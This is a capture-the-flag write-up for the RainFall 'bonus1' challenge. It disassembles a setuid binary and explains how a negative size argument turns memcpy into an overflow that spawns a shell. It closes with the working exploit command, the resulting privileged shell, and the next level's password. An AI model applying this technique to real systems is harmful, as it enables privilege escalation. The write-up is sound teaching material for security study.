# Bonus 1

- We login as user bonus1:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/bonus1/bonus1
```

```
bonus1@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 bonus2 users 5043 Mar  6  2016 bonus1
bonus1@RainFall:~$ gdb bonus1
```

```
Dump of assembler code for function main:
   0x08048424 <+0>:     push   %ebp
   0x08048425 <+1>:     mov    %esp,%ebp
   0x08048427 <+3>:     and    $0xfffffff0,%esp
   0x0804842a <+6>:     sub    $0x40,%esp

   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>

   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>

   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>

   0x0804849e <+122>:   mov    $0x0,%eax
   0x080484a3 <+127>:   leave  
   0x080484a4 <+128>:   ret    
End of assembler dump.
```

- Let's highlight the most important parts of the program:
```
   0x0804842d <+9>:     mov    0xc(%ebp),%eax
   0x08048430 <+12>:    add    $0x4,%eax
   0x08048433 <+15>:    mov    (%eax),%eax
   0x08048435 <+17>:    mov    %eax,(%esp)
   0x08048438 <+20>:    call   0x8048360 <atoi@plt>
   0x0804843d <+25>:    mov    %eax,0x3c(%esp)
   0x08048441 <+29>:    cmpl   $0x9,0x3c(%esp)
   0x08048446 <+34>:    jle    0x804844f <main+43>
   0x08048448 <+36>:    mov    $0x1,%eax
   0x0804844d <+41>:    jmp    0x80484a3 <main+127>
```
> Convert the first argument of the program to an integer using `<atoi@plt>`, then compare it with the integer 9. If it is greater, return.

```
   0x0804844f <+43>:    mov    0x3c(%esp),%eax
   0x08048453 <+47>:    lea    0x0(,%eax,4),%ecx
   0x0804845a <+54>:    mov    0xc(%ebp),%eax
   0x0804845d <+57>:    add    $0x8,%eax
   0x08048460 <+60>:    mov    (%eax),%eax
   0x08048462 <+62>:    mov    %eax,%edx
   0x08048464 <+64>:    lea    0x14(%esp),%eax
   0x08048468 <+68>:    mov    %ecx,0x8(%esp)
   0x0804846c <+72>:    mov    %edx,0x4(%esp)
   0x08048470 <+76>:    mov    %eax,(%esp)
   0x08048473 <+79>:    call   0x8048320 <memcpy@plt>
```
> Copy n bytes into `[esp+0x14]` from the second argument of the program, where n is the result of atoi multiplied by 4.

```
   0x08048478 <+84>:    cmpl   $0x574f4c46,0x3c(%esp)
   0x08048480 <+92>:    jne    0x804849e <main+122>
   0x08048482 <+94>:    movl   $0x0,0x8(%esp)
   0x0804848a <+102>:   movl   $0x8048580,0x4(%esp)
   0x08048492 <+110>:   movl   $0x8048583,(%esp)
   0x08048499 <+117>:   call   0x8048350 <execl@plt>
```
> `0x8048583: "/bin/sh"`

> Subsequently, if the value at `0x3c(%esp)` is equal to 0x574f4c46 ("WOLF"), open a shell.

- So, by providing a negative number as first argument, it allows us to write enough into memory to place 'WOLF' (backwards) at 0x3c(%esp):
```
bonus1@RainFall:~$ ./bonus1 -1073741800 ABCDEFGHIJKLMNOPQRSTUVWXYZABCDEFGHIJKLMNFLOW

$ whoami
bonus2

$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```